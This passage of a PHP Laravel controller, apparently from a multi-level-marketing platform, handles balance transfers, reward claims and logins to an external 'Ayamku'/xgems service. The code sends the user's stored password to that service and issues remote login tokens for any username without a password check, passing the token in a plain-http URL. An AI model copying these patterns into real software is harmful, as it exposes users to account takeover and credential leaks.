            $transaction->amount = $amount;
            $transaction->post_balance = getAmount($user->balance);
            $transaction->charge = 0;
            $transaction->trx_type = '+';
            $transaction->details = 'Added Balance Via Leader: '.$userStockiest->username;
            $transaction->trx =  $trx;
            $transaction->save();
            
            $userStockiest->balance -= $amount;
            $userStockiest->save();
            $transaction = new Transaction();
            $transaction->user_id = $userStockiest->id;
            $transaction->amount = $amount;
            $transaction->post_balance = getAmount($userStockiest->balance);
            $transaction->charge = 0;
            $transaction->trx_type = '-';
            $transaction->details = 'Leader Added Balance to: '.$user->username;
            $transaction->trx =  $trx;
            $transaction->save();

            addToLog('Added ' . $general->cur_sym . $amount . ' to ' . $user->username . ' balance');

            $notify[] = ['success', $general->cur_sym . $amount . ' has been added to ' . $user->username . ' balance'];

            notify($user, 'BAL_ADD', [
                'trx' => $trx,
                'amount' => $amount,
                'currency' => $general->cur_text,
                'post_balance' => getAmount($user->balance),
            ]);

        } else {
            if ($amount > $user->balance) {
                $notify[] = ['error', $userStockiest->username . ' has insufficient balance.'];
                return back()->withNotify($notify);
            }
            $user->balance -= $amount;
            $user->save();

            $transaction = new Transaction();
            $transaction->user_id = $user->id;
            $transaction->amount = $amount;
            $transaction->post_balance = getAmount($user->balance);
            $transaction->charge = 0;
            $transaction->trx_type = '-';
            $transaction->details = 'Subtract Balance By Leader: '.$userStockiest->username;
            $transaction->trx =  $trx;
            $transaction->save();

            $userStockiest->balance += $amount;
            $userStockiest->save();

            $transaction = new Transaction();
            $transaction->user_id = $userStockiest->id;
            $transaction->amount = $amount;
            $transaction->post_balance = getAmount($userStockiest->balance);
            $transaction->charge = 0;
            $transaction->trx_type = '+';
            $transaction->details = 'Leader Subtract Balance: '.$user->username;
            $transaction->trx =  $trx;
            $transaction->save();

            addToLog('Subtract '.$amount.' Balance '.$user->username);

            notify($user, 'BAL_SUB', [
                'trx' => $trx,
                'amount' => $amount,
                'currency' => $general->cur_text,
                'post_balance' => getAmount($user->balance)
            ]);
            $notify[] = ['success', $general->cur_sym . $amount . ' has been subtracted from ' . $user->username . ' balance'];
        }
        return back()->withNotify($notify);
    }
    public function provinces()
    {
        return \Indonesia::allProvinces();
    }

    public function cities(Request $request)
    {
        return \Indonesia::findProvince($request->id, ['cities'])->cities->pluck('name', 'id');
    }

    public function districts(Request $request)
    {
        return \Indonesia::findCity($request->id, ['districts'])->districts->pluck('name', 'id');
    }

    public function villages(Request $request)
    {
        return \Indonesia::findDistrict($request->id, ['villages'])->villages->pluck('name', 'id');
    }
    public function serialNum(Request $request){
        // dd(strtoupper($request->serial));
        $user = auth()->user();
        $cek = User::where('gold_no',strtoupper($request->serial))->first();
        if($cek){
            $notify[] = ['error', 'Serial Number Sudah Terdaftar Di User Lain, Cek Serial Number Lain!'];
            return back()->withNotify($notify);
        }
        $user->gold_no = strtoupper($request->serial);
        $user->save();
        $notify[] = ['success', 'Your data saved successfully'];
        addToLog('Add Gold Serial Number');
        return back()->withNotify($notify);
    }

    public function claimBonusReward(Request $request){
        // dd($request->all());
        
        $reward = BonusReward::find($request->type);
        if(isset($request->claim) && $request->claim == $reward->reward){
            $claim = 'reward';
        }else{
            $claim = 'equal';
        }
        $user = Auth::user();
        $cekClaim = ureward::where(['reward_id'=>$reward->id,'user_id'=>$user->id])->first();
    
        if($cekClaim){
            $notify[] = ['error', 'Your data has been on record, get your reward soon'];
            return back()->withNotify($notify);
        }

        if(!$reward){
            $notify[] = ['error', 'Bonus Not Found'];
            return back()->withNotify($notify);
        }
        if(isset($request->mark)){
            $req_kiri = promoSept('left'); //30
            $req_kanan = promoSept('right'); //0
            if($req_kiri < $reward->kiri || $req_kanan < $reward->kanan){
                $notify[] = ['error', "Can't Claim Reward!, beyond requirements"];
                return back()->withNotify($notify);
            }
        }else{
            $req_kiri = $user->userExtra->p_left - 3; //30
            $req_kanan = $user->userExtra->p_right - 3; //0
            if($req_kiri < $reward->kiri || $req_kanan < $reward->kanan){
                $notify[] = ['error', "Can't Claim Reward!, beyond requirements"];
                return back()->withNotify($notify);
            }
        }
        
        if($req_kiri >= $reward->kiri && $req_kanan >= $reward->kanan){
            $onClaim = [
                'left'      => $req_kiri,
                'right'     => $req_kanan,
                'is_gold'   => $user->userExtra->is_gold,
                'claim'     => $claim,
            ];
            ureward::create([
                'trx'       => getTrx(),
                'user_id'   => $user->id,
                'reward_id' => $reward->id,
                'status'    => 1,
                'detail'    => json_encode($onClaim)
            ]);
            $userExtra = UserExtra::where('user_id',$user->id)->first();
            if($reward->rp){
                $userExtra->p_right -= $reward->kanan;
                $userExtra->p_left  -= $reward->kiri;
                $userExtra->save();
            }
            $claim = $reward->claim==0?$reward->reward:$reward->claim;
            $notify[] = ['success', 'Your data has been on record, get your reward: '.$claim.' soon'];

            addToLog('Claim Reward '.$claim);

            return back()->withNotify($notify);
        }
            $notify[] = ['error', "Can't Claim Reward!, Error!"];
            return back()->withNotify($notify);
        
    }

    public function ayamkuRegister(Request $request){
        $user = Auth::user();
        $groupId = tarikGems()['id'];
        // dd($groupId);
        $apiEndpoint = env('AYAMKU_URL').'api/v1/register-masterplan';
        $postData = [
            'username'  => $user->username,
            'phone'     => clearSymbol($user->mobile),
            'email'     => $user->email,
            'gems'      => tarikGems()['gems'],
            'masterplan_count' => tarikGems()['count'],
            'password'  => $user->password
        ];

        $response = Http::post($apiEndpoint, $postData);

        if (!$response->successful()) {
            $notify[] = ['error','Server Xgems Error!'];
            return back()->withNotify($notify);
        }
        $res = json_decode($response->body(),true);
        if($res['status']==401){
            $notify[] = ['error','Ayamku: '. $res['message']];
            return back()->withNotify($notify);
        }elseif($res['status']==200){
            //akun xgems
            $user->xgems = 1;
            $user->save();

            //tarik gems
            DB::table('users')
                ->whereIn('id', $groupId)
                ->update(['gems' => 0]);
            //login

            $notify[] = ['success','Ayamku: '. $res['message']];
            return back()->withNotify($notify);
        }
        dd($res);    
    
    }
    public function ayamkuLogin(Request $request){
        $user = User::where('username',$request->username)->first();
        if($user){
            return 'url-not-valid';
        }
        $apiEndpoint = env('AYAMKU_URL').'api/v1/login-masterplan';
        $postData = [
            'username'  => $request->username
        ];
        $response = Http::post($apiEndpoint, $postData);
        $res = json_decode($response->body(),true);
        if($res['status']==200){
            $cookieValue = $res['token'];
            $cookie = Cookie::make('user', $cookieValue, 1440); 
            return Redirect::to('http://xgems.ai?id='.$res['token']);
        }else{
            $msg = $res['message'];
            $notify[] = ['error', $msg];
            return back()->withNotify($notify);
        }
        return 'url-not-valid';
    }
    public function ayamkuLoginAuth(Request $request){
        $apiEndpoint = env('AYAMKU_URL').'api/v1/login-masterplan';
        $postData = [
            'username'  => $request->username
        ];
        $response = Http::post($apiEndpoint, $postData);
        $res = json_decode($response->body(),true);
        if($res['status']==200){
            $cookieValue = $res['token'];
            $cookie = Cookie::make('user', $cookieValue, 1440); 
            return Redirect::to('http://xgems.ai?id='.$res['token']);
        }else{
            $msg = $res['message'];
            $notify[] = ['error', $msg];
            return back()->withNotify($notify);
        }
        return 'url-not-valid';
    }
}
